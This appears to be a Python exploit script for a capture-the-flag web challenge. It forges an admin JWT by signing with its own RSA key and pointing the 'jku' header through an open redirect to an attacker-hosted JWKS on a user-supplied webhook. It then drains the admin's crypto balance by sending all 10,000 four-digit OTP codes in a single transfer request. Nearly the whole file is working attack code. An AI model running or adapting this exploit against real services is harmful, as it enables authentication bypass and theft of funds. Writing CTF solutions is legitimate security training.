import httpx
import jwt
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend
import base64

class API:

    def __init__(self, url, webhook):
        self.url = url
        self.c = httpx.Client()
        self.webhook = webhook
    
    def register(self,):
        self.c.post(f"{self.url}/api/auth/register", json={"email": "aa@aa.com", "password": "aa"})

    # leak "kid" to forge jwt
    def getkid(self):
        jwks = self.c.get(f"{self.url}/.well-known/jwks.json").json()
        kid = jwks["keys"][0]["kid"]
        return kid

    def generate_rsa_keys(self):
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
            backend=default_backend()
        )

        with open("private.pem", "wb") as f:
            f.write(private_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.PKCS8,
                encryption_algorithm=serialization.NoEncryption()
            ))

        public_key = private_key.public_key()

        with open("public.pem", "wb") as f:
            f.write(public_key.public_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PublicFormat.SubjectPublicKeyInfo
            ))

        return public_key
    
    def extract_n_and_e(self, public_key):
        numbers = public_key.public_numbers()
        n = numbers.n
        e = numbers.e

        n_b64 = base64.urlsafe_b64encode(n.to_bytes((n.bit_length() + 7) // 8, 'big')).decode('utf-8').rstrip("=")
        e_b64 = base64.urlsafe_b64encode(e.to_bytes((e.bit_length() + 7) // 8, 'big')).decode('utf-8').rstrip("=")

        return n_b64, e_b64
    
    def craftJWT(self):
        public_key = self.generate_rsa_keys()
        n, e = self.extract_n_and_e(public_key)
        kid = self.getkid()

        jwks = {
            "keys": [
                {
                    "alg": "RS256",
                    "kty": "RSA",
                    "e": e,
                    "kid": kid,
                    "use": "sig",
                    "n": n
                }
            ]
        }

        payload = {
            "email": "financial-controller@frontier-board.htb",
        }

        headers = {
            "alg": "RS256",
            "kid": kid,
            "jku": f"http://127.0.0.1:1337/api/analytics/redirect?url={self.webhook}&ref=http://127.0.0.1:1337",
            "typ": "JWT"
        }

        with open("private.pem", "rb") as f:
            private_key_data = f.read()

        token = jwt.encode(
            payload,
            private_key_data,
            algorithm="RS256",
            headers=headers
        )
        self.c.headers["Authorization"] = f"Bearer {token}"

        return str(jwks).replace("'", "\"")

    def accessDashboard(self):
        r = self.c.get(f"{self.url}/api/dashboard")
        return r.status_code == 200, r.json()
    
    def getBalance(self):
        resp = self.c.get(f"{self.url}/api/crypto/balance").json()
        clcr_balance = resp[0]['availableBalance']
        print("[+] admin clcr balance: ", clcr_balance)
        return clcr_balance
    
    def generateOTP(self):
        otps = [f"{num:04}" for num in range(0, 10000)]
        return otps

    def transferBrutal(self, amount):
        data = { "to": "aa@aa.com", "coin": "CLCR", "amount": amount, "otp": self.generateOTP() }
        resp = self.c.post(f"{self.url}/api/crypto/transaction", json=data).json()
        return resp.get("success", False)


if __name__ == "__main__":
    webhook = input("Enter your webhook: ")
    api = API("http://localhost:1337", webhook)
    api.register()

    # craft admin jwt
    jwks = api.craftJWT()
    print("[+] JWT crafted")

    _ = input(f"set this jwks to your server, also set the content type to application/json\n{jwks}\nPress enter to continue")

    # check if jwt with admin creds is valid
    stat, _ = api.accessDashboard()
    if stat:
        print("[+] JWT is valid, You are an admin now")
    else:
        print("[-] JWT is invalid")
        exit()

    # transfer all balance to user
    balance = api.getBalance()
    if api.transferBrutal(balance):
        print("[+] Transfer success, admin balance is now 0, access dashboard")

    # get flag
    stat, resp = api.accessDashboard()
    flag = resp.get("flag", None)
    print(f"[+] Flag: {flag}")







        